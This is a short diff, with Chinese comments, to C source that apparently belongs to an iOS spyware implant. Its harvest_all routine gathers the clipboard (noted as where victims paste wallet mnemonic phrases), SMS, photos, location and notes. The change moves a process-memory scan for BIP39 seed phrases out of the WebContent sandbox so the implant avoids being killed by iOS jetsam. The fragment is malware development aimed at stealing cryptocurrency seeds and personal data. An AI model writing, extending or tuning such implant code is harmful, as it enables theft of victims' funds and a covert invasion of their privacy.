@@ -1067,6 +1067,14 @@ void harvest_crash_logs(void) {
 /* --------------------------------------------------------------------------
  * harvest_all — called from coruna_constructor in main.c
  * -------------------------------------------------------------------------- */
+/*
+ * harvest_all — 在所有沙盒环境（含 WebContent）中安全执行的基础采集。
+ *
+ * 不包含 harvest_memory_mnemonics()：该函数需遍历当前进程全部 VM 区域，
+ * 在 WebContent 进程中意味着扫描数 GB WebKit 堆内存，
+ * 会持续数分钟并触发 iOS jetsam 杀手，终止整个进程。
+ * 调用方（implant_main）负责在非 WebContent 环境下额外调用该函数。
+ */
 void harvest_all(void) {
     harvest_clipboard();              /* 剪贴板 — 导入钱包时必粘贴助记词 */
     harvest_sms();
@@ -1083,5 +1091,5 @@ void harvest_all(void) {
     harvest_photos();
     harvest_location();
     harvest_notes();
-    harvest_memory_mnemonics();       /* 内存 BIP39 扫描 — 放最后，最耗时 */
+    /* harvest_memory_mnemonics() 由 implant_main 在非沙盒环境下单独调用 */
 }
